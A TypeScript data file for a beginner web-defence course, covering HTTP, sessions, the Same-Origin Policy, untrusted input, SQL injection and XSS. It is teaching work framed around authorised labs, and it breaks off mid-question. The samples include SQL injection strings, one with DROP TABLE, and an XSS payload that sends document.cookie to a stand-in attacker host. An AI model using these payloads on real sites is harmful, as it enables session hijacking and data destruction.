import type { Level } from '../types'

const level: Level = {
  id: 'beginner',
  title: 'The defender’s web — from zero',
  summary:
    'Assumes no security background. Learn how the web really works — requests and responses, cookies and sessions, the browser’s origin model — and the two ideas the rest of web defence rests on: never trust user input, and the difference between data and code. Plus a safe lab to practise in.',
  outcomes: [
    'Set up a safe, deliberately vulnerable web lab',
    'Understand HTTP requests, responses, methods and status codes',
    'Explain cookies, sessions and the same-origin policy',
    'Identify where untrusted input enters a web app',
    'Grasp injection and XSS at the concept level',
    'Explain why passwords are hashed and why the web needs HTTPS',
  ],
  steps: [
    {
      id: 'bweb-b-01',
      title: 'Why web security, and the rules first',
      read: `Web applications are how most organisations expose themselves to the world — and so they are one of the most attacked surfaces there is. A single flaw in a web app can leak a whole customer database, so learning to build and defend web apps is core defensive work.

The **CIA triad** applies directly:

- **Confidentiality** — can an attacker read data they shouldn't (other users' records, the database)?
- **Integrity** — can they change data or inject code (deface the site, tamper with orders)?
- **Availability** — can they take the app down?

## OWASP — the map of web risk

The **Open Worldwide Application Security Project (OWASP)** publishes the **OWASP Top 10**, the industry-standard list of the most critical web-app security risks (injection, broken access control, and more). This track is organised around understanding and *defending* each of them. OWASP also provides free tools and deliberately vulnerable apps to learn on.

## The rule before anything else

You only ever test web apps **you own or have explicit written permission to test**. Attacking a live website you don't own is a crime, even "just to look". This whole track is built around **deliberately vulnerable practice apps** you run yourself and **bug-bounty programs / labs** that grant permission. Keep everything you do on your own turf or where you're explicitly authorised.

## Set up a safe lab

Run a vulnerable-by-design app locally (in a VM or container, isolated):

- **OWASP Juice Shop** — a modern, deliberately vulnerable web app, great for learning the Top 10 hands-on.
- **DVWA** (Damn Vulnerable Web Application) — a classic, with adjustable difficulty.
- **PortSwigger Web Security Academy** — free, excellent labs (with permission built in).

You'll also want an **intercepting proxy** — **Burp Suite** (Community) or **OWASP ZAP** — which sits between your browser and the app so you can see and modify the actual requests. Seeing the raw HTTP is how web security clicks.

## The plan

Build the model: how the web works → cookies/sessions/origins → where input enters → the two core ideas (never trust input; data vs code) → injection and XSS at the concept level → passwords and HTTPS. Then, in later levels, the full OWASP Top 10 and how to defend each. By the end of this level you'll set up the lab and map an app's attack surface — the foundation of web defence.`,
      sample: {
        lang: 'text',
        caption: 'A web attack, seen through the CIA triad',
        code: `A flaw lets an attacker read the whole "users" table:

  Confidentiality  BROKEN  - every user's data is exposed
  Integrity        maybe   - can they also modify it?
  Availability     intact  - the site still works

One web-app bug -> a database breach. That is why web security
matters so much, and why OWASP catalogues the top risks.`,
        output: `Web apps are heavily attacked because they face the world.
Learn on deliberately vulnerable apps (Juice Shop, DVWA) with
an intercepting proxy (Burp/ZAP). Only ever test what you own
or are authorised to test.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the OWASP Top 10?',
        options: [
          'A list of the ten best web browsers',
          'The industry-standard list of the most critical web application security risks (such as injection and broken access control), published by OWASP and used to prioritise web-app defence',
          'A ranking of the ten most secure websites',
          'A programming language for the web',
        ],
        answer: 1,
        explain:
          'The OWASP Top 10 is a widely used, regularly updated list of the most critical web application security risks — injection, broken access control, cryptographic failures, and so on. It gives defenders a prioritised map of what to understand and defend against, and this track is organised around learning and defending each item. OWASP also provides free tools and deliberately vulnerable apps (like Juice Shop) to practise on.',
        hint: 'It’s published by OWASP and lists the top web-app *risks*.',
      },
    },

    {
      id: 'bweb-b-02',
      title: 'How the web works',
      read: `A web app is a conversation between a **client** (the browser) and a **server**, over HTTP (the protocol from the networking track). Understanding this request/response loop is the foundation of everything.

## The request/response cycle

1. You enter a URL or click a link. The browser sends an **HTTP request** to the server.
2. The server processes it (maybe queries a database, runs code) and sends back an **HTTP response** (usually an HTML page, or data).
3. The browser renders the response. Further requests fetch images, scripts, styles, or data (often via JavaScript in the background).

## Client-side vs server-side — a crucial distinction

- **Client-side** — code that runs in the *user's browser*: HTML, CSS, and **JavaScript**. The user (and an attacker) has **full control** over their own browser, so **anything client-side can be inspected, modified, or bypassed.**
- **Server-side** — code that runs on the *server* (in Python, PHP, Node, Java, etc.), which the user cannot see or directly control. This is where real security decisions must be enforced.

**The single most important consequence:** client-side controls are *not* security. A "you can't do that" enforced only in JavaScript can be trivially bypassed by an attacker who edits the page, disables JS, or crafts the request directly (with a proxy like Burp). **All security checks must be enforced server-side**, because that's the only side the user doesn't control. Client-side checks are for user convenience (instant feedback); server-side checks are for security.

## The URL

A URL names what you're requesting: \`https://shop.example.com/product?id=42\` — scheme (https), host (shop.example.com), path (/product), and **query parameters** (id=42). Those parameters, and everything else in the request, are **user input** — the attacker can set them to anything.

## Why the defender cares

A web app takes requests (which the attacker fully controls) and produces responses (which may include data, or run in the victim's browser). Almost every web vulnerability comes down to: the app trusted something in the request it shouldn't have, or put untrusted data somewhere dangerous in the response. Holding the request/response loop — and the client/server divide — clearly in mind is what makes the rest make sense.`,
      sample: {
        lang: 'text',
        caption: 'The request/response loop, and who controls what',
        code: `[ BROWSER (client) ]                    [ SERVER ]
  user fully controls this side           user cannot see/control this
     |  HTTP request  GET /product?id=42   |
     |  (attacker can set id to ANYTHING)  |
     |------------------------------------>|  runs server code,
     |                                     |  queries the database
     |<------------------------------------|
     |  HTTP response (HTML / data)        |
  renders it (+ runs any JavaScript)

Client-side checks (JavaScript) = convenience, NOT security.
An attacker edits the page or crafts the request directly.
Enforce ALL security server-side - the side they don't control.`,
        output: `The web = request (attacker-controlled) -> server processing
-> response. Security MUST be enforced server-side, because the
client side is fully under the user's (attacker's) control.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A web app checks in JavaScript (in the browser) that a user is an administrator before showing an admin button. Is this a sufficient security control?',
        options: [
          'Yes — JavaScript checks are secure',
          'No — client-side (JavaScript) code runs in the user’s browser, which they fully control, so the check can be bypassed by editing the page, disabling JS, or crafting the request directly; the authorization must be enforced server-side, where the user has no control',
          'Yes, as long as the JavaScript is minified',
          'Only if the user is using a mobile browser',
        ],
        answer: 1,
        explain:
          'Anything client-side is under the user’s full control and can be inspected, modified, or bypassed — so a JavaScript-only check is not a security control. The attacker can simply send the request that the admin button would send, directly (e.g. via Burp), skipping the check entirely. Security decisions (authentication, authorization, validation) must be enforced server-side, the only side the user cannot manipulate. Client-side checks are for user experience; server-side checks are for security.',
        hint: 'Who controls the code running in the browser, and can they skip it?',
      },
    },

    {
      id: 'bweb-b-03',
      title: 'HTTP requests and responses in detail',
      read: `You met HTTP in the networking track; now look at it as a web-app defender, because the details of a request are exactly what an attacker manipulates.

## The request

\`\`\`
POST /login HTTP/1.1
Host: shop.example.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 ...

username=alice&password=secret
\`\`\`

- **Method** — GET (fetch, parameters in the URL), POST (send data, in the body), plus PUT/DELETE/PATCH (used by APIs). GET requests are logged and cached, so sensitive data shouldn't go in a GET URL.
- **Path & query** — what's requested, with parameters.
- **Headers** — metadata: \`Host\`, \`Cookie\` (session), \`Content-Type\`, \`User-Agent\`, \`Referer\`, \`Authorization\`. **Every header is attacker-controllable** — a common mistake is trusting a header (like \`X-Forwarded-For\` or \`Host\`) as if it were reliable.
- **Body** — the submitted data (form fields, JSON).

**All of it — path, parameters, headers, cookies, body — is user input the attacker can set to anything.** A request is not a form politely filled in; it's raw data the client chose to send.

## The response

\`\`\`
HTTP/1.1 200 OK
Set-Cookie: session=abc123; HttpOnly; Secure
Content-Type: text/html

<html>...</html>
\`\`\`

- **Status code** — 200 OK, 301/302 redirect, 400 bad request, 401 unauthorized, 403 forbidden, 404 not found, 500 server error. Defenders read patterns in these (bursts of 401/403 = auth attacks; 500s = something breaking or being exploited).
- **Headers** — including **security headers** (\`Set-Cookie\` flags, \`Content-Security-Policy\`, and more — covered later) that instruct the browser to behave more safely.
- **Body** — the HTML/data returned.

## Seeing and modifying requests

The defining tool is an **intercepting proxy** (Burp/ZAP): it sits between browser and server so you can view the exact request, **modify it**, and resend it. This reveals the truth the browser hides — that you can change *any* part of a request, including "hidden" form fields and values the UI never lets you edit. Understanding that a request is fully malleable is the beginning of thinking like both an attacker and a defender.`,
      sample: {
        lang: 'text',
        caption: 'A request is fully malleable — the proxy proves it',
        code: `What the browser UI shows:  a login form (username, password)

What actually gets sent (and can be changed in Burp/ZAP):
  POST /login HTTP/1.1
  Host: shop.example.com
  Cookie: session=abc123           <- attacker can change
  X-Forwarded-For: 1.2.3.4         <- attacker can forge (don't trust!)
  User-Agent: anything             <- attacker-controlled
  username=alice&password=secret   <- and any "hidden" fields too

Every part of the request is attacker-controllable input.`,
        output: `Method, path, query, headers, cookies, body - ALL of it is
user input the attacker sets freely. Never trust a header (like
X-Forwarded-For) as reliable. A proxy lets you see and modify
the real request behind the UI.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is it a mistake for a web app to trust an HTTP header like `X-Forwarded-For` (claimed client IP) as reliable?',
        options: [
          'Headers are always missing',
          'Every part of an HTTP request, including headers, is set by the client and can be forged by an attacker — so a header claiming the client’s IP (or any other trusted-looking value) can be set to anything and must not be relied on for security decisions',
          'X-Forwarded-For is encrypted and unreadable',
          'Only POST requests have headers',
        ],
        answer: 1,
        explain:
          'The entire request — method, path, parameters, cookies, body, and every header — is composed by the client, so an attacker can set any of it to arbitrary values (easily seen with an intercepting proxy). A header like X-Forwarded-For is just a string the client sent; trusting it as the real client IP (for access control, rate limiting, logging decisions) lets an attacker spoof it. Security decisions must rest on things the attacker can’t forge, not on attacker-supplied headers.',
        hint: 'Who sets the headers in a request, and can they put whatever they want?',
      },
    },

    {
      id: 'bweb-b-04',
      title: 'Cookies and sessions',
      read: `HTTP is **stateless** — each request is independent, and the server doesn't inherently remember you between requests. So how does a site keep you logged in? **Sessions**, tracked with **cookies**.

## How it works

1. You log in (POST your credentials). The server verifies them and creates a **session** — a record on the server that "this session is alice, logged in."
2. The server sends back a **session cookie**: \`Set-Cookie: session=abc123\`. The value (\`abc123\`) is a **session ID** — a long, random, unguessable token that identifies your session.
3. Your browser automatically includes that cookie on every subsequent request to the site: \`Cookie: session=abc123\`.
4. The server looks up the session ID, sees it belongs to alice, and treats the request as coming from alice — without re-asking for the password.

## Why the session ID is so sensitive

The session ID **is** your identity to the app — anyone who has it *is* you, as far as the server is concerned. So if an attacker steals your session cookie (**session hijacking**), they're logged in as you without needing your password. This is why:

- Session IDs must be **long, random and unguessable** (so an attacker can't guess or brute-force one).
- They must be protected in transit and at rest.

## The protective cookie flags (a first look)

The \`Set-Cookie\` header can carry flags that protect the session cookie — a foundational defensive control:

- **\`HttpOnly\`** — the cookie **cannot be read by JavaScript**, so a cross-site scripting flaw (XSS, later) can't steal it via \`document.cookie\`.
- **\`Secure\`** — the cookie is **only sent over HTTPS**, so it isn't exposed on an unencrypted connection.
- **\`SameSite\`** — restricts when the cookie is sent on cross-site requests, helping defend against CSRF (later).

A session cookie for a logged-in user should essentially always be **HttpOnly; Secure** (and usually SameSite). Missing these flags is a common, real finding.

## Why the defender cares

Sessions are how the web maintains "who you are" across a stateless protocol, and the session ID is a credential as powerful as a password. Understanding sessions is prerequisite to understanding authentication, session hijacking, XSS (which steals cookies), and CSRF (which abuses them) — much of web attack and defence revolves around protecting the session.`,
      sample: {
        lang: 'text',
        caption: 'The session lifecycle, and the protective cookie flags',
        code: `1. POST /login  username=alice&password=secret
2. server verifies -> creates session -> responds:
   Set-Cookie: session=9f3a...longrandom...  HttpOnly; Secure; SameSite=Lax
3. browser auto-sends on every request:
   Cookie: session=9f3a...longrandom...
4. server: session 9f3a = alice, logged in -> request treated as alice

The session ID IS your identity. Steal it = be you (no password).
So: long/random/unguessable + HttpOnly (no JS access) +
    Secure (HTTPS only) + SameSite (CSRF defense).`,
        output: `HTTP is stateless; sessions (via a random session-ID cookie)
maintain login. The session ID is a credential as powerful as a
password - protect it with HttpOnly, Secure, SameSite and by
making it unguessable.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why should a session cookie have the `HttpOnly` flag set?',
        options: [
          'It makes the cookie load faster',
          'HttpOnly prevents JavaScript from reading the cookie (via document.cookie), so a cross-site scripting (XSS) vulnerability cannot steal the session ID through script — an important protection since the session ID is a credential as powerful as the password',
          'It encrypts the cookie’s value',
          'It makes the cookie last longer',
        ],
        answer: 1,
        explain:
          'The session ID identifies the logged-in user, so stealing it lets an attacker impersonate them without the password. `HttpOnly` tells the browser not to expose the cookie to JavaScript, so even if the app has an XSS flaw, the injected script cannot read and exfiltrate the session cookie via `document.cookie`. Combined with `Secure` (HTTPS-only, so it’s not exposed in transit) and `SameSite` (CSRF defence), it’s a foundational protection for session cookies.',
        hint: 'What common attack steals cookies via JavaScript, and what does HttpOnly deny it?',
      },
    },

    {
      id: 'bweb-b-05',
      title: 'The browser security model',
      read: `Browsers enforce security rules that are the backdrop to all web-app security. The most important is the **Same-Origin Policy** — understanding it (and its relaxations) is essential.

## Origin

An **origin** is the combination of **scheme + host + port**: \`https://shop.example.com:443\`. Two URLs have the same origin only if all three match. \`https://shop.example.com\` and \`https://evil.example.com\` are *different* origins (different host); so are \`http://\` vs \`https://\` (different scheme).

## The Same-Origin Policy (SOP)

The SOP is the browser's core isolation rule: **script running on one origin cannot read data from a different origin.** So JavaScript on \`evil.example.com\` cannot read the contents of your \`bank.example.com\` tab, cannot read \`bank.example.com\`'s cookies, and cannot read the response of a request it makes to \`bank.example.com\`.

Without the SOP, any malicious site you visited could read all your other tabs, your webmail, your bank — it's the fundamental wall that keeps sites isolated from each other in your browser.

## An important subtlety: sending vs reading

The SOP restricts *reading* cross-origin responses, but the browser will still *send* some cross-origin requests (and attach your cookies). This gap is exactly what **CSRF** (later) exploits: evil.example.com can cause your browser to *send* a request to bank.example.com with your cookies (the request goes through), even though it can't *read* the response. Knowing "the request is sent with your cookies, but the response can't be read cross-origin" explains a whole class of attacks and defences.

## CORS — relaxing the SOP deliberately

Sometimes a site legitimately needs to let another origin read its data (e.g. an API used by a separate front-end). **CORS (Cross-Origin Resource Sharing)** is the controlled mechanism to allow that: the server sends headers (\`Access-Control-Allow-Origin\`) explicitly permitting specific origins to read its responses. CORS is a *relaxation* of the SOP, granted by the server — and a common misconfiguration is making it too permissive (\`Access-Control-Allow-Origin: *\` on sensitive data, or reflecting any origin), which can undo the SOP's protection. A defender checks CORS is scoped to only the origins that truly need it.

## Why it matters

The SOP is the browser's foundational isolation guarantee, and much of web security lives in its rules and exceptions: XSS is dangerous partly *because* it runs code *within* the victim origin (so the SOP doesn't protect against it — the script is same-origin); CSRF exploits the send-vs-read gap; CORS misconfigurations weaken the wall. Holding the origin model clearly — same origin, SOP restricts reading, requests still get sent, CORS relaxes it deliberately — is essential background for the vulnerabilities ahead.`,
      sample: {
        lang: 'text',
        caption: 'Same-Origin Policy: what a malicious site can and cannot do',
        code: `You are logged into bank.example.com, then visit evil.example.com.

Script on evil.example.com tries to:
  read your bank.example.com tab's content     -> BLOCKED by SOP
  read bank.example.com's cookies              -> BLOCKED by SOP
  read the response of a request to the bank   -> BLOCKED by SOP
  SEND a request to bank.example.com
     (browser attaches your bank cookies!)     -> ALLOWED (this is CSRF)

Origin = scheme + host + port (all three must match).
CORS = the server deliberately allowing specific other origins to read.`,
        output: `The Same-Origin Policy stops one origin's script from READING
another origin's data - the browser's core isolation wall. But
requests are still SENT cross-origin with your cookies (CSRF).
CORS relaxes SOP deliberately; too-permissive CORS is a finding.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What does the browser’s Same-Origin Policy (SOP) fundamentally prevent?',
        options: [
          'It prevents any website from using JavaScript',
          'It prevents script running on one origin (scheme+host+port) from reading data belonging to a different origin — such as another site’s page content, cookies, or response bodies — keeping sites isolated from each other in the browser',
          'It encrypts all web traffic',
          'It blocks all cross-origin requests entirely',
        ],
        answer: 1,
        explain:
          'The SOP is the browser’s core isolation rule: JavaScript on one origin cannot *read* data from a different origin (another tab’s content, its cookies, or the responses to cross-origin requests). This stops a malicious site from reading your other logged-in tabs. Note it restricts *reading*, not always *sending* — cross-origin requests may still be sent with your cookies (the basis of CSRF) — and CORS is the server-controlled way to deliberately relax it for specific origins.',
        hint: 'It’s about one site’s script *reading* another site’s data. What does it stop, and what (sending) does it still allow?',
      },
    },

    {
      id: 'bweb-b-06',
      title: 'Where untrusted input enters an app',
      read: `To defend a web app you must know its **attack surface** — every place attacker-controlled data enters. Almost every web vulnerability starts with untrusted input arriving somewhere and being mishandled, so mapping the entry points is step one.

## The entry points

Everything the client sends is untrusted input:

- **URL query parameters** — \`?id=42&sort=name\`.
- **URL path segments** — \`/user/42/profile\` (the 42 is input).
- **POST body / form fields** — including **hidden fields** and disabled fields (the client can send anything, regardless of what the form shows).
- **JSON / API request bodies** — every field.
- **HTTP headers** — \`User-Agent\`, \`Referer\`, \`Host\`, \`X-Forwarded-For\`, custom headers — all attacker-settable.
- **Cookies** — the client can modify cookie values (except what the server signs/validates).
- **File uploads** — filename, content, content-type — all controllable, and a rich attack surface.
- **Anything derived from the above** — a value read from input, stored, and used later (**stored/second-order** input — e.g. a username saved now and displayed to an admin later).

## The lesson: the client controls all of it

A crucial mindset shift: the app's UI (the form, the dropdown, the "max length" field) is just a *suggestion*. The attacker doesn't use your UI — they send raw requests (with a proxy). So:

- A dropdown with three options? The attacker sends a fourth value.
- A hidden field \`price=9.99\`? The attacker changes it to \`price=0.01\`.
- A \`maxlength="20"\` on an input? The attacker sends 10,000 characters.
- A field the UI marks read-only? The attacker sends a new value.

**Client-side constraints are not constraints** (the client/server lesson again). Every field, in every request, can contain anything.

## Mapping the surface

A defender (and attacker) maps the surface by exploring the app *through a proxy*, cataloguing every parameter, every endpoint, every header and cookie the app reads — because each is a place input arrives and might be mishandled. This map is the foundation for finding and fixing vulnerabilities: you check each entry point for "does the app safely handle whatever an attacker could put here?"

The unifying idea of the next steps: **untrusted input arriving at an entry point, then used unsafely, is the root of most web vulnerabilities.** Knowing every entry point — and that the client controls all of them regardless of the UI — is where defence begins.`,
      sample: {
        lang: 'text',
        caption: 'The UI is a suggestion; the attacker sends raw requests',
        code: `The form shows:                What the attacker actually sends:
  quantity: [dropdown 1-5]        quantity=-1   (or 99999)
  price:    (hidden) 49.99        price=0.01
  role:     (not in the form!)    role=admin    (extra field, try it)
  comment:  maxlength=200         comment=<10000 chars / a script>
  file:     "image only" (JS)     file: shell.php  (bypass the JS check)

Every parameter, hidden field, header, cookie and upload is
attacker-controlled input, whatever the UI implies.`,
        output: `The attack surface = every place input enters: query/path
params, body, JSON, headers, cookies, uploads, and stored
values used later. The UI's limits are suggestions; the client
sends whatever it wants. Map every entry point.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A checkout form has a hidden field `price=49.99` and a quantity dropdown limited to 1–5. Why can a defender not rely on these client-side constraints?',
        options: [
          'Hidden fields are encrypted',
          'The attacker sends raw HTTP requests (e.g. via a proxy), not the UI form, so they can change the hidden price to 0.01 and send any quantity (like -1 or 99999) regardless of what the form allows — every field is attacker-controlled input the server must validate',
          'Dropdowns cannot be changed',
          'The server automatically ignores modified fields',
        ],
        answer: 1,
        explain:
          'The form UI only suggests what values are expected; the attacker bypasses it entirely by crafting the HTTP request directly, so hidden fields, dropdown limits, maxlength, and read-only markers provide no security. A hidden `price=49.99` can be sent as `price=0.01`; a 1–5 dropdown can send `-1` or `99999`. The server must independently validate and enforce every value (e.g. look up the real price server-side, check quantity bounds), because every field is untrusted, attacker-controlled input.',
        hint: 'Does the attacker use your form, or send the request directly with whatever values they choose?',
      },
    },

    {
      id: 'bweb-b-07',
      title: 'Never trust user input',
      read: `If web security had one commandment, it would be: **never trust user input.** Nearly every vulnerability in the OWASP Top 10 is, at root, the app trusting attacker-controlled data it shouldn't have. This step makes that principle concrete, because it underlies everything that follows.

## Why "never trust"

From the last steps: *all* input is attacker-controlled, and the client ignores your UI. So you must assume every piece of input is **hostile** — crafted by an attacker to break your app — until you've handled it safely. The attacker will send:

- Values you didn't expect (negative numbers, huge strings, wrong types, missing fields, extra fields).
- Special characters meant to break out of context (quotes, angle brackets, semicolons, SQL/HTML/shell metacharacters).
- Data designed to be interpreted as **code** rather than data (the next step).

## The two defensive strategies

There are two complementary ways to handle untrusted input safely:

1. **Validate input** — check it's what you expect *as early as possible*, and reject what isn't. Prefer **allow-listing** (accept only known-good: "quantity must be an integer 1–100", "this must be one of these three values", "this must match this format") over **deny-listing** (trying to block known-bad, which always misses cases). Validate type, length, format, range, and set. Validation reduces the attack surface but is **not sufficient alone** (some valid input still needs safe handling downstream).

2. **Handle input safely in context** — whenever input is *used* — in a database query, in HTML output, in a shell command, in a file path — use it in a way that keeps it as **data, never code** (the next steps: parameterized queries for SQL, output encoding for HTML, etc.). This is the deeper defence, because it makes the input safe *at the point of danger* regardless of what it contains.

## Validation is not the whole answer

A common beginner mistake is thinking "I validated the input, so I'm safe." Validation helps, but the robust defence is **context-appropriate safe handling at every point the data is used** — because the same input goes into a SQL query (needs parameterization), into HTML (needs HTML encoding), into a shell (needs care), and each context has its own "keep it as data" technique. Validate *and* handle safely; don't rely on validation alone.

## Server-side, always

And — the client/server lesson once more — all of this must happen **server-side**. Client-side validation is for user convenience (instant feedback); it does nothing for security because the attacker bypasses it.

"Never trust user input" is the mindset. The concrete techniques — validation (allow-list, server-side) and safe handling in each context (data, not code) — are what the rest of web defence teaches. Every vulnerability ahead is a specific case of input being trusted or mishandled; every defence is a specific way of not trusting it.`,
      sample: {
        lang: 'text',
        caption: 'Two layers: validate (allow-list) AND handle safely in context',
        code: `Input arrives: quantity = "-1'; DROP TABLE users;--"

Layer 1 - VALIDATE (allow-list, server-side, reject bad):
  is it an integer between 1 and 100?  -> NO -> reject
  (blocks unexpected values early)

Layer 2 - SAFE HANDLING in context (assume it could be anything):
  used in SQL?   -> parameterized query (input = data, never code)
  shown in HTML? -> HTML-encode it     (input = text, never markup)
  in a shell?    -> avoid/escape       (input = arg, never command)

Validate AND handle safely - don't rely on validation alone.`,
        output: `Never trust user input. Assume it's hostile. Defend two ways:
VALIDATE (allow-list what you expect, server-side) AND HANDLE
SAFELY at every point it's used (keep it data, not code). Every
web vuln is trusted/mishandled input; every defense is not trusting it.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is "I validated the input, so the app is safe" an incomplete approach to handling untrusted data?',
        options: [
          'Validation is never useful',
          'Validation (especially allow-listing) reduces risk but is not sufficient alone — the same input may be used in multiple contexts (SQL, HTML, shell, file paths), each needing its own context-appropriate safe handling to keep the data from being interpreted as code; robust defence combines validation with safe handling at every point the data is used',
          'Validation should only be done client-side',
          'Validated input can always be trusted completely',
        ],
        answer: 1,
        explain:
          'Validation (best done as server-side allow-listing) catches unexpected values early and shrinks the attack surface, but it doesn’t make input safe everywhere it’s later used. The same value might go into a SQL query (needs parameterization), into HTML (needs output encoding), into a shell command, or a file path — each context has its own technique for keeping input as *data, not code*. Relying on validation alone leaves gaps; the robust approach validates AND handles input safely in each context — all server-side.',
        hint: 'The same input can be used in SQL, HTML, and a shell — does one validation make it safe in all of them?',
      },
    },

    {
      id: 'bweb-b-08',
      title: 'Injection: mixing data and code',
      read: `**Injection** is one of the oldest and most damaging web vulnerability classes, and it comes from one root cause: **mixing untrusted data with code**, so that data the attacker controls gets *interpreted as code*. Understanding the concept (this step) matters more than any single instance.

## The core idea

Many things an app does involve building a **command or query as text** and sending it to an interpreter:

- An **SQL query** sent to a database.
- A **shell command** run on the OS.
- An **LDAP query**, an **OS command**, a template, etc.

If the app builds that command by **concatenating** (gluing) untrusted input into the command string, the attacker can include characters that *break out of the data part and add their own code*. The interpreter can't tell "the data the developer meant" from "the code the attacker injected" — it's all one string.

## The classic example: SQL injection

Suppose an app looks up a user by building SQL with string concatenation:

\`\`\`
query = "SELECT * FROM users WHERE name = '" + input + "'"
\`\`\`

With normal input \`alice\`, that's fine. But the attacker sends input \`' OR '1'='1\`:

\`\`\`
SELECT * FROM users WHERE name = '' OR '1'='1'
\`\`\`

Now the \`OR '1'='1'\` (always true) is *code*, not data — it changes the query's logic, returning **every** user. Worse inputs can read other tables, modify data, or (in some cases) run commands. The attacker's data became SQL code because it was concatenated into the query.

## Why it happens, and the fix (previewed)

The vulnerability exists whenever **untrusted data is concatenated into a command that an interpreter parses**. The robust fix is to **keep data and code separate** so the interpreter always treats input as *just data*:

- For SQL: **parameterized queries / prepared statements** — the query structure is fixed and the input is passed separately as a parameter, so it can *never* be parsed as SQL code, no matter what it contains. (You'll learn this properly in the amateur level.)
- For shell commands: avoid shells / use safe APIs that pass arguments separately.
- The general principle: **never build commands by concatenating untrusted input**; use mechanisms that separate the code (which you control) from the data (which the attacker controls).

## The concept generalizes

Every injection — SQL, OS command, LDAP, and more — is the same shape: **data crossing into code because they were mixed.** And the defence is always the same shape: **keep data as data**, using an interpreter-appropriate mechanism (parameterization, safe APIs) that separates the two. This "data vs code" idea is one of the two foundational lessons of web security (the other is "never trust input", which is its parent). Hold the shape, and every specific injection makes sense.`,
      sample: {
        lang: 'sql',
        caption: 'How concatenation lets data become code (SQL injection)',
        code: `-- app builds:  "SELECT * FROM users WHERE name = '" + input + "'"

-- normal input: alice
SELECT * FROM users WHERE name = 'alice';        -- fine

-- attacker input:  ' OR '1'='1
SELECT * FROM users WHERE name = '' OR '1'='1';  -- always true!
-- the OR '1'='1' is CODE the attacker injected -> returns ALL users

-- attacker input:  '; DROP TABLE users;--
SELECT * FROM users WHERE name = ''; DROP TABLE users;--';`,
        output: `Injection = untrusted data concatenated into a command becomes
CODE the interpreter runs. Root cause: data and code mixed.
Fix (previewed): keep them separate - parameterized queries for
SQL, safe APIs elsewhere - so input is ALWAYS just data.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the fundamental root cause of injection vulnerabilities (like SQL injection)?',
        options: [
          'Using a database at all',
          'Untrusted data is mixed with code — e.g. concatenated into a query or command string — so the attacker’s input can break out of the data context and be interpreted as code by the interpreter, which cannot distinguish developer-intended structure from attacker-injected commands',
          'The server being too slow',
          'Using HTTPS instead of HTTP',
        ],
        answer: 1,
        explain:
          'Injection arises when an app builds a command or query by gluing untrusted input into a string that an interpreter (SQL engine, shell, LDAP, etc.) then parses. Because data and code share one string, attacker input containing the interpreter’s special characters can escape the data portion and become executable code — the interpreter can’t tell intended structure from injected commands. The fix is to keep data and code separate (parameterized queries, safe APIs) so input is always treated as pure data, never parsed as code.',
        hint: 'What happens when attacker-controlled *data* ends up glued into a *command* the interpreter parses?',
      },
    },

    {
      id: 'bweb-b-09',
      title: 'Cross-site scripting: untrusted data in the page',
      read: `**Cross-Site Scripting (XSS)** is injection's counterpart on the *output* side, and it's one of the most common web vulnerabilities. Where SQL injection puts attacker data into a *query*, XSS puts attacker data into an *HTML page* — where it can be interpreted as **JavaScript that runs in other users' browsers**.

## The core idea

A web app takes data and puts it into the HTML it sends back. If **untrusted input is placed into the page without being made safe**, an attacker can include HTML/JavaScript that the victim's browser then executes — **as if it came from the trusted site.** It's the "data vs code" problem again, but the "code" is client-side script and the interpreter is the browser.

Example: a page shows a search term back to the user:

\`\`\`
<p>You searched for: SEARCH_TERM</p>
\`\`\`

If the app inserts the raw search term and the attacker's "term" is \`<script>...</script>\`, the browser runs that script.

## Why it's dangerous

The injected script runs **in the victim's browser, in the context of the trusted site's origin** — so (recall the Same-Origin Policy) it can:

- **Steal the session cookie** (unless \`HttpOnly\`) → session hijacking → become the victim.
- **Read and exfiltrate data** the user can see.
- **Perform actions as the user** (submit forms, make requests) — the SOP doesn't stop it, because the script *is* running on the trusted origin.
- Deface the page, or trick the user (fake login prompts).

Because the script executes with the trusted site's privileges *for that user*, XSS effectively hands the attacker control of the victim's session on that site.

## The types (briefly)

- **Reflected XSS** — the malicious input is in the request and reflected in the immediate response (attacker gets a victim to click a crafted link).
- **Stored XSS** — the malicious input is *saved* by the app (a comment, a profile field) and served to *every* viewer — more dangerous, as it needs no per-victim link (e.g. a script in a comment that runs for everyone who reads it, including admins).
- **DOM-based XSS** — the injection happens in client-side JavaScript manipulating the page.

## The fix (previewed)

The primary defence is **output encoding / escaping**: whenever you put untrusted data into HTML, convert the dangerous characters (\`<\`, \`>\`, \`&\`, \`"\`, \`'\`) into their harmless HTML-entity forms (\`&lt;\`, \`&gt;\`, ...), so the browser renders them as *text*, not markup/script. Modern frameworks (React, etc.) do this automatically by default, which is why using them safely prevents most XSS. Additional defences include a **Content-Security-Policy** (restricts what scripts can run) and \`HttpOnly\` cookies (limits the damage). You'll learn these properly in the amateur level.

XSS is the "untrusted data placed into output unsafely" vulnerability — the output-side twin of injection. The concept: attacker data becomes executable script in victims' browsers on the trusted origin; the defence: encode output so data stays data (text), never becomes code (markup/script).`,
      sample: {
        lang: 'html',
        caption: 'Untrusted data in HTML becomes executable script (XSS)',
        code: `<!-- app inserts the raw search term into the page: -->
<p>You searched for: SEARCH_TERM</p>

<!-- attacker's "search term": -->
<script>fetch('https://evil.example/c?'+document.cookie)</script>

<!-- rendered page: the browser RUNS the script, on the trusted
     origin, stealing the victim's cookie (if not HttpOnly): -->
<p>You searched for: <script>fetch('https://evil.example/c?'+document.cookie)</script></p>`,
        output: `XSS = untrusted data put into the page unsafely, so it runs as
script in victims' browsers ON THE TRUSTED ORIGIN - stealing
sessions, acting as the user. Fix (previewed): output-encode
data into HTML (< becomes &lt; etc.) so it stays TEXT, not code;
+ CSP and HttpOnly. Frameworks encode by default.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is cross-site scripting (XSS) dangerous — what can the injected script do?',
        options: [
          'Nothing; it only changes colours on the page',
          'The script runs in the victim’s browser in the context of the trusted site’s origin, so it can steal the session cookie (unless HttpOnly), read data the user sees, and perform actions as the user — effectively taking over the victim’s session on that site, because the Same-Origin Policy does not protect against same-origin script',
          'It only affects the attacker’s own browser',
